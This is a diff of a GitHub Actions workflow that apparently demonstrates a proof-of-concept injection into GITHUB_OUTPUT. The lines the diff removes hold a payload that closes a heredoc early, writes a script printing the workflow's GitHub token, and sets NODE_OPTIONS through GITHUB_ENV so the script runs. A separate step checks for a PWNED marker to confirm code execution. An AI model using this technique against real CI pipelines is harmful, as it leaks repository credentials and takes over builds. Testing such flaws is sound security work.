@@ -58,11 +58,7 @@ jobs:
         run: |
           {
             echo 'comment-content<<GHAOUT'
-            echo '<h2>Scanned Files</h2>'
-            echo '<ul><li>attacker-manifest'
-            echo 'EOF'
-            echo 'printf "%s" "process.stdout.write(\"LEAKED_TOKEN:\"+process.env.INPUT_GITHUB_TOKEN+\"\\n\")" > /tmp/steal.js; touch "$GITHUB_WORKSPACE/PWNED"; echo "NODE_OPTIONS=--require=/tmp/steal.js" >> "$GITHUB_ENV"; exit 0'
-            echo '</li></ul>'
+            cat payload.txt
             echo 'GHAOUT'
           } >> "$GITHUB_OUTPUT"
       - name: Save dependency review output report
@@ -78,10 +74,5 @@ jobs:
             core.info('next action executed')
       - name: Verify impact
         run: |
-          echo "payload event: ${{ github.event.workflow_run.event }}"
           echo "payload head_branch: ${{ github.event.workflow_run.head_branch }}"
-          echo "payload head_repo: ${{ github.event.workflow_run.head_repository.full_name }}"
-          echo "--- marker check ---"
           ls -la PWNED && echo "RCE CONFIRMED"
-          echo "--- report head ---"
-          sed -n '1,8p' openssf-report.html
